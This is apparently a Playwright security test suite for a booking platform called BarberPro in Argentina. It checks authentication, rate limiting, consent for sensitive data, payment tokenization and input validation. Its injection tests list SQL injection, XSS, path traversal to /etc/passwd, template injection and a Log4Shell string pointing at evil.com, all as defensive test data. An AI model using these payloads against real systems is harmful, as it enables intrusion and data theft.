/**
 * Security Testing Procedures - Day 8 Advanced Testing Framework
 * BarberPro Premium Service Booking Platform - Argentina Market
 * 
 * Comprehensive security testing including:
 * - Psychology data privacy protection
 * - Payment security and PCI DSS validation
 * - Argentina compliance security
 * - API security and rate limiting
 * - Data encryption and tokenization
 */

import { test, expect, type Page, type APIRequestContext } from '@playwright/test';

test.describe('Security Validation Testing', () => {
  let apiContext: APIRequestContext;

  test.beforeAll(async ({ playwright }) => {
    apiContext = await playwright.request.newContext({
      baseURL: 'http://localhost:3000',
      extraHTTPHeaders: {
        'User-Agent': 'BarberPro-Security-Tests/1.0'
      }
    });
  });

  test.afterAll(async () => {
    await apiContext.dispose();
  });

  test.describe('Authentication and Authorization Security', () => {
    test('JWT token security validation', async () => {
      // Test invalid JWT tokens
      const invalidTokens = [
        'invalid.jwt.token',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '',
        'Bearer ',
        'malformed-token'
      ];

      for (const token of invalidTokens) {
        const response = await apiContext.get('/api/user/profile', {
          headers: {
            'Authorization': `Bearer ${token}`
          }
        });
        
        expect(response.status()).toBe(401);
        const responseBody = await response.json();
        expect(responseBody.error).toContain('Invalid token');
      }
    });

    test('Password security requirements validation', async () => {
      const weakPasswords = [
        '123456',
        'password',
        'qwerty',
        '12345678',
        'admin',
        'password123',
        'abc123'
      ];

      for (const password of weakPasswords) {
        const response = await apiContext.post('/api/auth/register', {
          data: {
            email: 'test@example.com',
            password: password,
            name: 'Test User'
          }
        });

        expect(response.status()).toBe(400);
        const responseBody = await response.json();
        expect(responseBody.error).toMatch(/password.*weak|password.*requirements/i);
      }

      // Test strong password acceptance
      const strongPassword = 'SecureP@ssw0rd!2024#Argentina';
      const strongPasswordResponse = await apiContext.post('/api/auth/register', {
        data: {
          email: 'secure@test.com',
          password: strongPassword,
          name: 'Secure User',
          dni: '12345678'
        }
      });

      expect([200, 201]).toContain(strongPasswordResponse.status());
    });

    test('Rate limiting for authentication endpoints', async () => {
      const loginAttempts = [];
      
      // Attempt multiple rapid logins
      for (let i = 0; i < 10; i++) {
        loginAttempts.push(
          apiContext.post('/api/auth/login', {
            data: {
              email: 'attacker@test.com',
              password: 'wrongpassword'
            }
          })
        );
      }

      const responses = await Promise.all(loginAttempts);
      
      // Should be rate limited after several attempts
      const rateLimitedResponses = responses.filter(r => r.status() === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      
      // Check rate limit headers
      const lastResponse = responses[responses.length - 1];
      if (lastResponse.status() === 429) {
        const retryAfter = lastResponse.headers()['retry-after'];
        expect(retryAfter).toBeDefined();
        expect(parseInt(retryAfter)).toBeGreaterThan(0);
      }
    });

    test('Role-based access control validation', async () => {
      // Test unauthorized access to admin endpoints
      const userToken = 'user-jwt-token'; // Regular user token
      
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/providers/verify',
        '/api/admin/system/metrics',
        '/api/admin/payments/analytics'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await apiContext.get(endpoint, {
          headers: {
            'Authorization': `Bearer ${userToken}`
          }
        });
        
        expect(response.status()).toBe(403);
        const responseBody = await response.json();
        expect(responseBody.error).toMatch(/forbidden|unauthorized|insufficient.*privileges/i);
      }
    });
  });

  test.describe('Psychology Data Privacy Protection', () => {
    test('GDPR Article 9 sensitive data protection', async () => {
      const sensitiveData = {
        mentalHealthHistory: 'Patient has history of depression',
        therapyNotes: 'Session notes about anxiety treatment',
        medicalConditions: 'ADHD, anxiety disorder',
        personalData: {
          name: 'John Doe',
          email: 'john@test.com',
          phone: '+5491123456789'
        }
      };

      // Test that sensitive data requires explicit consent
      const response = await apiContext.post('/api/psychology/session-data', {
        data: sensitiveData
      });

      expect(response.status()).toBe(400);
      const responseBody = await response.json();
      expect(responseBody.error).toMatch(/consent.*required|gdpr.*compliance/i);

      // Test with proper consent
      const consentedResponse = await apiContext.post('/api/psychology/session-data', {
        data: {
          ...sensitiveData,
          gdprConsent: true,
          consentTimestamp: new Date().toISOString(),
          lawfulBasis: 'explicit_consent',
          dataSubjectRights: true
        }
      });

      expect([200, 201]).toContain(consentedResponse.status());
    });

    test('Therapy session data encryption validation', async () => {
      const sessionData = {
        clientId: 'client-123',
        therapistId: 'therapist-456',
        sessionNotes: 'Confidential therapy session notes',
        treatmentPlan: 'Cognitive behavioral therapy approach',
        mentalHealthAssessment: 'GAD-7 score: 12'
      };

      const response = await apiContext.post('/api/psychology/create-session', {
        data: sessionData,
        headers: {
          'Authorization': 'Bearer valid-therapist-token'
        }
      });

      expect(response.status()).toBe(201);
      const responseBody = await response.json();
      
      // Verify data is encrypted in storage
      expect(responseBody.sessionNotes).not.toBe(sessionData.sessionNotes);
      expect(responseBody.encryptionMethod).toBe('AES-256-GCM');
      expect(responseBody.encrypted).toBe(true);
      
      // Verify only authorized access
      const unauthorizedAccess = await apiContext.get(`/api/psychology/session/${responseBody.id}`, {
        headers: {
          'Authorization': 'Bearer invalid-token'
        }
      });
      
      expect(unauthorizedAccess.status()).toBe(401);
    });

    test('Data anonymization for research purposes', async () => {
      const researchRequest = {
        studyPurpose: 'Anxiety treatment efficacy research',
        dataTypes: ['session_outcomes', 'treatment_duration', 'assessment_scores'],
        excludeIdentifiers: true,
        gdprCompliant: true
      };

      const response = await apiContext.post('/api/psychology/research-data', {
        data: researchRequest,
        headers: {
          'Authorization': 'Bearer researcher-token'
        }
      });

      expect(response.status()).toBe(200);
      const responseBody = await response.json();
      
      // Verify anonymization
      expect(responseBody.data).toBeDefined();
      expect(responseBody.anonymized).toBe(true);
      
      // Check that no PII is present
      const dataString = JSON.stringify(responseBody.data);
      expect(dataString).not.toMatch(/email|phone|name|dni|address/i);
      
      // Verify k-anonymity compliance
      expect(responseBody.kAnonymity).toBeGreaterThanOrEqual(5);
    });

    test('Therapist-client privilege protection', async () => {
      const privilegedCommunication = {
        fromTherapist: 'therapist-123',
        toClient: 'client-456',
        message: 'Confidential therapy communication',
        encrypted: true
      };

      // Test that privileged communications are protected
      const adminAccessAttempt = await apiContext.get('/api/communications/therapist-client', {
        headers: {
          'Authorization': 'Bearer admin-token'
        }
      });

      // Even admins should not access privileged communications
      expect(adminAccessAttempt.status()).toBe(403);
      const responseBody = await adminAccessAttempt.json();
      expect(responseBody.error).toMatch(/privileged.*communication|therapist.*client.*privilege/i);
    });
  });

  test.describe('Payment Security and PCI DSS Validation', () => {
    test('Credit card data protection', async () => {
      const cardData = {
        cardNumber: '4111111111111111',
        expiryMonth: '12',
        expiryYear: '2027',
        cvv: '123',
        cardholderName: 'Juan Pérez'
      };

      // Test that raw card data is never stored
      const tokenizeResponse = await apiContext.post('/api/payments/tokenize', {
        data: cardData
      });

      expect(tokenizeResponse.status()).toBe(200);
      const tokenResponse = await tokenizeResponse.json();
      
      // Verify tokenization
      expect(tokenResponse.token).toBeDefined();
      expect(tokenResponse.last4).toBe('1111');
      expect(tokenResponse.cardNumber).toBeUndefined();
      expect(tokenResponse.cvv).toBeUndefined();
      
      // Verify PCI compliance
      expect(tokenResponse.pciCompliant).toBe(true);
      expect(tokenResponse.tokenizationMethod).toBe('vault');
    });

    test('Payment processing security validation', async () => {
      const paymentData = {
        amount: 10000, // ARS
        currency: 'ARS',
        paymentToken: 'secure-payment-token-123',
        merchantId: 'barberpro-argentina',
        transactionId: 'tx-' + Date.now()
      };

      const response = await apiContext.post('/api/payments/process', {
        data: paymentData,
        headers: {
          'Authorization': 'Bearer valid-client-token',
          'X-Payment-Signature': 'hmac-sha256-signature'
        }
      });

      if (response.status() === 200) {
        const responseBody = await response.json();
        
        // Verify security measures
        expect(responseBody.transactionId).toBeDefined();
        expect(responseBody.secureProcessing).toBe(true);
        expect(responseBody.fraudScore).toBeDefined();
        expect(responseBody.fraudScore).toBeLessThan(50); // Low fraud risk
      }
    });

    test('MercadoPago integration security', async () => {
      const mercadopagoData = {
        token: 'mp-test-token',
        installments: 3,
        issuerId: '25',
        paymentMethodId: 'visa',
        amount: 7500,
        currency: 'ARS'
      };

      // Test webhook signature verification
      const webhookPayload = {
        action: 'payment.updated',
        api_version: 'v1',
        data: { id: '123456789' },
        date_created: new Date().toISOString(),
        id: 'webhook-notification-123',
        live_mode: false,
        type: 'payment',
        user_id: '123456789'
      };

      const webhookResponse = await apiContext.post('/api/webhooks/mercadopago', {
        data: webhookPayload,
        headers: {
          'X-Signature': 'invalid-signature'
        }
      });

      // Should reject invalid signatures
      expect(webhookResponse.status()).toBe(401);
      
      const validWebhookResponse = await apiContext.post('/api/webhooks/mercadopago', {
        data: webhookPayload,
        headers: {
          'X-Signature': 'valid-hmac-sha256-signature'
        }
      });

      expect([200, 202]).toContain(validWebhookResponse.status());
    });

    test('Financial data encryption at rest', async () => {
      const financialData = {
        transactionAmount: 12500,
        taxAmount: 2625,
        clientDNI: '12345678',
        providerCUIT: '20-12345678-9',
        invoiceNumber: 'A-0001-00000123'
      };

      const response = await apiContext.post('/api/financial/store-transaction', {
        data: financialData,
        headers: {
          'Authorization': 'Bearer valid-admin-token'
        }
      });

      if (response.status() === 201) {
        const responseBody = await response.json();
        
        // Verify encryption indicators
        expect(responseBody.encrypted).toBe(true);
        expect(responseBody.encryptionAlgorithm).toBe('AES-256');
        expect(responseBody.keyManagement).toBe('vault');
        
        // Verify sensitive data is not returned in plain text
        expect(responseBody.clientDNI).not.toBe(financialData.clientDNI);
        expect(responseBody.providerCUIT).not.toBe(financialData.providerCUIT);
      }
    });
  });

  test.describe('Argentina Compliance Security Testing', () => {
    test('AFIP data protection and integrity', async () => {
      const afipData = {
        transactionId: 'tx-123456',
        amount: 15000,
        taxAmount: 3150,
        clientDNI: '12345678',
        providerCUIT: '20-12345678-9',
        serviceType: 'professional_services'
      };

      const response = await apiContext.post('/api/afip/submit-transaction', {
        data: afipData,
        headers: {
          'Authorization': 'Bearer valid-provider-token',
          'X-AFIP-Certificate': 'base64-encoded-certificate'
        }
      });

      if (response.status() === 200) {
        const responseBody = await response.json();
        
        // Verify AFIP compliance
        expect(responseBody.afipCompliant).toBe(true);
        expect(responseBody.digitalSignature).toBeDefined();
        expect(responseBody.auditTrail).toBeDefined();
        
        // Verify data integrity
        expect(responseBody.dataHash).toBeDefined();
        expect(responseBody.tamperProof).toBe(true);
      }
    });

    test('DNI/CUIT validation security', async () => {
      const invalidIdentifiers = [
        'DROP TABLE users',
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        '12345678\'; DROP TABLE users; --',
        'null',
        'undefined'
      ];

      for (const invalidId of invalidIdentifiers) {
        const response = await apiContext.post('/api/argentina/validate-identity', {
          data: {
            dni: invalidId,
            cuit: invalidId
          }
        });

        expect(response.status()).toBe(400);
        const responseBody = await response.json();
        expect(responseBody.error).toMatch(/invalid.*format|security.*violation/i);
      }
    });

    test('Argentina personal data protection law compliance', async () => {
      const personalData = {
        fullName: 'María González',
        dni: '23456789',
        email: 'maria@test.com',
        phone: '+5491123456789',
        address: 'Av. Corrientes 1234, Buenos Aires',
        sensitiveData: true
      };

      // Test data processing consent requirements
      const response = await apiContext.post('/api/users/store-personal-data', {
        data: personalData
      });

      expect(response.status()).toBe(400);
      const responseBody = await response.json();
      expect(responseBody.error).toMatch(/consent.*required|argentina.*data.*protection/i);

      // Test with proper consent
      const consentedResponse = await apiContext.post('/api/users/store-personal-data', {
        data: {
          ...personalData,
          argentinaDataConsent: true,
          consentTimestamp: new Date().toISOString(),
          dataRetentionAgreed: true,
          rightsAcknowledged: true
        }
      });

      expect([200, 201]).toContain(consentedResponse.status());
    });
  });

  test.describe('API Security and Rate Limiting', () => {
    test('SQL injection prevention', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM payments --",
        "'; INSERT INTO users VALUES ('hacker', 'admin'); --",
        "' OR 1=1 --"
      ];

      for (const injection of sqlInjectionAttempts) {
        const response = await apiContext.get('/api/providers/search', {
          params: {
            name: injection,
            location: injection
          }
        });

        // Should not return 500 error (indicates SQL error)
        expect(response.status()).not.toBe(500);
        
        if (response.status() === 400) {
          const responseBody = await response.json();
          expect(responseBody.error).toMatch(/invalid.*parameter|security.*violation/i);
        }
      }
    });

    test('XSS prevention validation', async () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>'
      ];

      for (const xss of xssAttempts) {
        const response = await apiContext.post('/api/providers/create', {
          data: {
            name: xss,
            description: xss,
            location: xss
          },
          headers: {
            'Authorization': 'Bearer valid-provider-token'
          }
        });

        if (response.status() === 201) {
          const responseBody = await response.json();
          
          // Verify XSS content is sanitized
          expect(responseBody.name).not.toContain('<script>');
          expect(responseBody.description).not.toContain('javascript:');
          expect(responseBody.location).not.toContain('<img');
        }
      }
    });

    test('CSRF protection validation', async () => {
      // Test state-changing operations without CSRF token
      const response = await apiContext.post('/api/bookings', {
        data: {
          providerId: 'provider-123',
          serviceId: 'service-456',
          scheduledFor: new Date().toISOString()
        },
        headers: {
          'Authorization': 'Bearer valid-token'
          // Missing CSRF token
        }
      });

      // Should require CSRF token for state-changing operations
      if (response.status() === 403) {
        const responseBody = await response.json();
        expect(responseBody.error).toMatch(/csrf.*token|forbidden/i);
      }
    });

    test('API rate limiting by endpoint', async () => {
      const endpoints = [
        { path: '/api/auth/login', limit: 5 },
        { path: '/api/providers/search', limit: 100 },
        { path: '/api/bookings', limit: 20 }
      ];

      for (const endpoint of endpoints) {
        const requests = [];
        
        // Make requests beyond the limit
        for (let i = 0; i < endpoint.limit + 5; i++) {
          requests.push(
            apiContext.post(endpoint.path, {
              data: { test: true }
            })
          );
        }

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status() === 429);
        
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      }
    });
  });

  test.describe('Data Encryption and Tokenization', () => {
    test('End-to-end encryption validation', async () => {
      const sensitiveMessage = {
        from: 'therapist-123',
        to: 'client-456',
        content: 'Confidential therapy discussion',
        messageType: 'therapy_communication'
      };

      const response = await apiContext.post('/api/messages/send-encrypted', {
        data: sensitiveMessage,
        headers: {
          'Authorization': 'Bearer valid-therapist-token'
        }
      });

      if (response.status() === 201) {
        const responseBody = await response.json();
        
        // Verify end-to-end encryption
        expect(responseBody.encrypted).toBe(true);
        expect(responseBody.encryptionType).toBe('end-to-end');
        expect(responseBody.content).not.toBe(sensitiveMessage.content);
        expect(responseBody.keyExchange).toBeDefined();
      }
    });

    test('Token-based authentication security', async () => {
      // Test token refresh security
      const refreshResponse = await apiContext.post('/api/auth/refresh', {
        data: {
          refreshToken: 'valid-refresh-token'
        }
      });

      if (refreshResponse.status() === 200) {
        const responseBody = await refreshResponse.json();
        
        // Verify new tokens are generated
        expect(responseBody.accessToken).toBeDefined();
        expect(responseBody.refreshToken).toBeDefined();
        expect(responseBody.tokenType).toBe('Bearer');
        
        // Verify old refresh token is invalidated
        const oldTokenResponse = await apiContext.post('/api/auth/refresh', {
          data: {
            refreshToken: 'valid-refresh-token' // Same token should be invalid now
          }
        });
        
        expect(oldTokenResponse.status()).toBe(401);
      }
    });

    test('Data at rest encryption validation', async () => {
      // Test that sensitive data is encrypted in storage
      const response = await apiContext.get('/api/security/encryption-status', {
        headers: {
          'Authorization': 'Bearer valid-admin-token'
        }
      });

      if (response.status() === 200) {
        const responseBody = await response.json();
        
        // Verify encryption status for different data types
        expect(responseBody.userPersonalData.encrypted).toBe(true);
        expect(responseBody.paymentData.encrypted).toBe(true);
        expect(responseBody.therapyNotes.encrypted).toBe(true);
        expect(responseBody.financialRecords.encrypted).toBe(true);
        
        // Verify encryption algorithms
        expect(responseBody.encryptionAlgorithm).toBe('AES-256-GCM');
        expect(responseBody.keyManagement).toBe('external-vault');
      }
    });
  });

  test.describe('Vulnerability Scanning and Penetration Testing', () => {
    test('Common vulnerability checks', async () => {
      // Test for common security headers
      const response = await apiContext.get('/api/health');
      const headers = response.headers();
      
      // Security headers validation
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-frame-options']).toBeDefined();
      expect(headers['x-xss-protection']).toBeDefined();
      expect(headers['strict-transport-security']).toBeDefined();
      expect(headers['content-security-policy']).toBeDefined();
    });

    test('Information disclosure prevention', async () => {
      // Test error messages don't leak sensitive information
      const response = await apiContext.get('/api/nonexistent-endpoint');
      expect(response.status()).toBe(404);
      
      const responseBody = await response.json();
      
      // Should not reveal system information
      expect(JSON.stringify(responseBody)).not.toMatch(/stack trace|database|internal|server error details/i);
    });

    test('Input validation and sanitization', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
        'file:///etc/passwd',
        '{{7*7}}',
        '<%= 7*7 %>'
      ];

      for (const input of maliciousInputs) {
        const response = await apiContext.post('/api/test/input-validation', {
          data: {
            userInput: input
          }
        });

        // Should validate and sanitize input
        expect(response.status()).toBe(400);
        const responseBody = await response.json();
        expect(responseBody.error).toMatch(/invalid.*input|security.*violation/i);
      }
    });
  });
});